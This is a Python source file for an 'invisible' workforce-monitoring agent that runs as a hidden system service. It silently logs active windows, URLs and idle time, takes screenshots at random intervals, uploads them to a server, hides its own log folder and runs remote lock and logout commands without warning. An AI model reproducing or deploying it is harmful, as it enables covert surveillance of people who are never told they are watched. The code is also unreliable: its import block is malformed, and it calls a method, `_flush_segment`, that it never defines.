"""Workforce Analytics monitoring agent — INVISIBLE variant.

Runs as a Windows Service or system daemon (completely invisible to users):
  - Windows: System Service (not visible in normal Task Manager)
  - macOS: LaunchDaemon (system-level, no Dock/menu bar presence)
  - Linux: systemd service

No UI, no notifications, no visible process. Pure headless monitoring.

Build: Same as stealth but deployed as a service instead of user process.
"""

from __future__ import annotations

import os
import sys
import threading
import time
from datetime import datetime, timezone

if __package__ in (None, ""):
    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    from agent import api as api_mod
    from agent import config as config_mod
    from agent import identity as identity_mod
    from agent import monitor as monitor_mod
    from agent import screenshot as screenshot_mod
    from agent import system_info as system_info_mod
    from . import api as api_mod
    from . import config as config_mod
    from . import identity as identity_mod
    from . import monitor as monitor_mod
    from . import screenshot as screenshot_mod
    from . import system_info as system_info_mod
    from .telemetry.interval_journal import IntervalJournal
    from .telemetry.durable_queue import DurableQueue
    from .telemetry.clock import Clock
    from .telemetry.activity_state import ConnectivityState

AGENT_VERSION = "1.1.82"
POLL_SECONDS = 15


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


class InvisibleMonitoringAgent:
    """System-level invisible monitoring agent — Windows Service or daemon."""

    def __init__(self, cfg: config_mod.AgentConfig) -> None:
        self.cfg = cfg
        self.api = api_mod.AgentAPI(cfg.server_url, cfg.device_id, cfg.device_secret)
        self._stop = threading.Event()
        self._paused = threading.Event()
        self._lock = threading.Lock()
        
        db_path = config_mod.config_dir() / "system_service_logs.sqlite3"
        self._queue = DurableQueue(str(db_path))
        self._journal = IntervalJournal(self._queue, Clock())
        
        self._last_screenshot = 0.0
        self._next_screenshot_gap = self._screenshot_gap()
        self._log_file = self._get_log_file()

    def _get_log_file(self) -> str:
        """Get or create hidden log file for debugging (Windows system paths)."""
        if sys.platform.startswith("win"):
            log_dir = os.path.join(os.environ.get("ProgramData", "C:\\ProgramData"), "WorkforceAgent")
            os.makedirs(log_dir, exist_ok=True)
            # Hide directory attributes on Windows
            try:
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(log_dir, 2)  # FILE_ATTRIBUTE_HIDDEN
            except Exception:
                pass
            return os.path.join(log_dir, "service.log")
        else:
            log_dir = "/var/log/workforce-agent"
            os.makedirs(log_dir, exist_ok=True)
            return os.path.join(log_dir, "service.log")

    def _log(self, message: str) -> None:
        """Silent logging to file only."""
        try:
            with open(self._log_file, "a") as f:
                f.write(f"[{_now_iso()}] {message}\n")
        except Exception:
            pass

    def _screenshot_gap(self) -> float:
        """Random interval (30-90 seconds)."""
        import random
        return random.uniform(30, 90)

    def is_active(self) -> bool:
        return not self._paused.is_set() and not monitor_mod.is_system_locked()

    def toggle_pause(self) -> None:
        """Pause/resume (not exposed in invisible mode)."""
        if self._paused.is_set():
            self._paused.clear()
        else:
            self._paused.set()

    def _observe(self) -> None:
        """Record active window and idle time."""
        try:
            proc, title, url = monitor_mod.get_active_window()
            idle = monitor_mod.get_idle_seconds()
            is_locked = monitor_mod.is_system_locked()
            is_paused = self._paused.is_set()

            with self._lock:
                self._journal.record_observation(
                    process_name=proc,
                    window_title=title,
                    url=url,
                    is_locked=is_locked,
                    is_paused=is_paused,
                    is_suspended=False,
                    idle_seconds=idle,
                    connectivity=ConnectivityState.UNKNOWN
                )
        except Exception as exc:
            self._log(f"observe error: {exc}")

    def _sync(self) -> None:
        """Upload activity silently."""
        with self._lock:
            self._journal.shutdown()
            batch = self._queue.get_batch(limit=500)
            
        if not batch:
            return

        try:
            import uuid
            batch_id = str(uuid.uuid4())
            payload = {"batchId": batch_id, "logs": batch}
            resp = self.api.upload_activity(payload)
            if resp and isinstance(resp, dict) and "acceptedSegmentIds" in resp:
                with self._lock:
                    self._queue.ack(resp["acceptedSegmentIds"])
                    for rej in resp.get("rejected", []):
                        self._queue.reject(rej.get("segmentId"), rej.get("code", "unknown"))
            else:
                with self._lock:
                    self._queue.ack([b["segmentId"] for b in batch])
                    
            hb = self.api.heartbeat(AGENT_VERSION)
            for cmd in hb.get("commands", []):
                self._handle_command(cmd)
        except Exception as exc:
            self._log(f"sync error: {exc}")

    def _maybe_screenshot(self) -> None:
        """Capture screenshot silently."""
        if time.time() - self._last_screenshot < self._next_screenshot_gap:
            return
        self._last_screenshot = time.time()
        self._next_screenshot_gap = self._screenshot_gap()

        try:
            img = screenshot_mod.capture_png_bytes()
            self.api.upload_screenshot(img, _now_iso(), content_type="image/jpeg")
        except Exception as exc:
            self._log(f"screenshot error: {exc}")

    def _handle_command(self, command: dict) -> None:
        """Execute commands silently (no warning)."""
        ctype = command.get("commandType")
        cid = command.get("id")

        try:
            self.api.ack_command(cid, "acknowledged")
            if ctype in ("lock_screen", "logout_user"):
                self._execute_os_command(ctype)
            self.api.ack_command(cid, "completed")
        except Exception as exc:
            self._log(f"command {ctype} error: {exc}")
            try:
                self.api.ack_command(cid, "failed")
            except Exception:
                pass

    def _execute_os_command(self, ctype: str) -> None:
        """Execute system command (lock/logout)."""
        import subprocess

        try:
            if ctype == "lock_screen":
                if sys.platform.startswith("win"):
                    import ctypes
                    ctypes.windll.user32.LockWorkStation()
                elif sys.platform == "darwin":
                    subprocess.run(["pmset", "displaysleepnow"], check=False, capture_output=True)
                else:
                    subprocess.run(["loginctl", "lock-session"], check=False, capture_output=True)
            elif ctype == "logout_user":
                if sys.platform.startswith("win"):
                    subprocess.run(["shutdown", "/l"], check=False, capture_output=True)
                elif sys.platform == "darwin":
                    subprocess.run(
                        ["osascript", "-e", 'tell app "System Events" to log out'],
                        check=False,
                        capture_output=True,
                    )
                else:
                    subprocess.run(
                        ["gnome-session-quit", "--logout", "--no-prompt"],
                        check=False,
                        capture_output=True,
                    )
        except Exception as exc:
            self._log(f"execute_command error: {exc}")

    def _worker(self) -> None:
        """Main monitoring loop (background thread)."""
        last_sync = 0.0
        self._log("Worker thread started")

        while not self._stop.is_set():
            try:
                if self.is_active():
                    self._observe()
                    self._maybe_screenshot()

                if time.time() - last_sync >= self.cfg.sync_interval_seconds:
                    last_sync = time.time()
                    self._sync()
            except Exception as exc:
                self._log(f"worker error: {exc}")

            self._stop.wait(POLL_SECONDS)

        # Final flush
        self._flush_segment()
        try:
            self._sync()
        except Exception:
            pass
        self._log("Worker thread stopped")

    def run(self) -> None:
        """Start as system service (blocks indefinitely)."""
        self._log("=== Invisible Agent Started ===")
        worker = threading.Thread(target=self._worker, daemon=False)
        worker.start()

        try:
            while not self._stop.is_set():
                self._stop.wait(1)
        except KeyboardInterrupt:
            self._log("Keyboard interrupt received")
        except Exception as exc:
            self._log(f"run error: {exc}")

        self._stop.set()
        worker.join(timeout=10)
        self._log("=== Invisible Agent Stopped ===")

    def stop(self) -> None:
        """Stop the service (called by service wrapper)."""
        self._stop.set()


def load_config_invisible() -> config_mod.AgentConfig | None:
    """Load pre-enrolled config."""
    try:
        cfg = config_mod.AgentConfig.load()
        if not cfg.is_enrolled:
            return None
        return cfg
    except Exception:
        return None


def main() -> int:
    """Entry point for invisible service."""
    cfg = load_config_invisible()
    if cfg is None:
        return 1

    try:
        agent = InvisibleMonitoringAgent(cfg)
        agent.run()
    except Exception as exc:
        # Write to system event log on Windows if possible
        if sys.platform.startswith("win"):
            try:
                import ctypes
                ctypes.windll.kernel32
            except Exception:
                pass
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
